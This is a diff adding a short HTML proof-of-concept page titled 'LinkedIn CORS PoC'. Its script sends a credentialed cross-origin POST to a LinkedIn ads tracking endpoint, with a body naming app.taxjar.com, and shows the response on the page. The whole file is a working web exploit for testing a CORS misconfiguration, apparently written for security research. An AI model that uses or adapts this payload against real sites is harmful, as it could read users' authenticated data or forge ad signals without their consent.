@@ -1,0 +1,31 @@
+<!DOCTYPE html>
+<html>
+  <body>
+    <h1>🔥 LinkedIn CORS PoC</h1>
+    <button onclick="exploit()">Send Request</button>
+    <pre id="output">Waiting...</pre>
+    <script>
+      function exploit() {
+        fetch("https://px.ads.linkedin.com/wa/", {
+          method: "POST",
+          credentials: "include",
+          headers: {
+            "Content-Type": "text/plain;charset=UTF-8"
+          },
+          body: JSON.stringify({
+            url: "https://app.taxjar.com/",
+            domain: "app.taxjar.com",
+            signalType: "CLICK"
+          })
+        })
+        .then(res => res.text())
+        .then(data => {
+          document.getElementById("output").textContent = data;
+        })
+        .catch(err => {
+          document.getElementById("output").textContent = "Error: " + err;
+        });
+      }
+    </script>
+  </body>
+</html>
